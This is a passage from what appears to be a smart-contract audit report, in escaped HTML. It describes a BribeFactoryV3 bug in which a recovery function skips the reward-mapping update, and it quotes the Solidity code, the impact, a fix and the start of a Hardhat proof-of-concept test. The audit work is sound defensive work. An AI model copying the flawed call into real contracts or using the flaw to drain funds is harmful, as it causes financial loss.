class=\"mtk12\"\u003e_amounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;MISMATCH_LEN\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_bribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++){\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_amounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIBribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_bribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eemergencyRecoverERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e], \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_amounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe function calls \u003ccode\u003eIBribe(_bribe[i]).emergencyRecoverERC20\u003c/code\u003e instead of \u003ccode\u003eIBribe(_bribe[i]).recoverERC20AndUpdateData\u003c/code\u003e. The correct function, \u003ccode\u003erecoverERC20AndUpdateData\u003c/code\u003e in the \u003ccode\u003eBribe\u003c/code\u003e contract, updates the \u003ccode\u003etokenRewardsPerEpoch\u003c/code\u003e mapping to reflect the recovered tokens:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"52\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erecoverERC20AndUpdateData\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyAllowed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt;= \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;TOO_MUCH\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_startTimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eactive_period\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() + \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eWEEK\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_lastReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenRewardsPerEpoch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_startTimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenRewardsPerEpoch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_startTimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_lastReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eRecovered\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIn contrast, \u003ccode\u003eemergencyRecoverERC20\u003c/code\u003e only transfers tokens without updating the mapping:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"53\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eemergencyRecoverERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyAllowed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt;= \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;TOO_MUCH\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eRecovered\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"impact-8\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-8\" aria-label=\"impact 8 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eIncorrect reward accounting - failing to update \u003ccode\u003etokenRewardsPerEpoch\u003c/code\u003e can lead to over-distribution of rewards. Users may claim rewards based on outdated values, potentially draining the \u003ccode\u003eBribe\u003c/code\u003e contract’s token balance.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-12\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-12\" aria-label=\"recommended mitigation steps 12 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eUpdate the function Call in \u003ccode\u003eBribeFactoryV3\u003c/code\u003e:\u003c/p\u003e\n\u003cp\u003eModify the \u003ccode\u003erecoverERC20AndUpdateData\u003c/code\u003e function in \u003ccode\u003eBribeFactoryV3.sol\u003c/code\u003e to call the correct \u003ccode\u003erecoverERC20AndUpdateData\u003c/code\u003e function.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-7\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-7\" aria-label=\"proof of concept 7 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"54\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e } = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;chai\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eupgrades\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e } = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;hardhat\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eZERO_ADDRESS\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e } = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;@openzeppelin/test-helpers/src/constants.js\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003edescribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;BribeFactoryV3 Recovery Functions\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebribeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockVoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockGaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockTokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockVe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebeforeEach\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003easync\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Get signers\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        [\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan 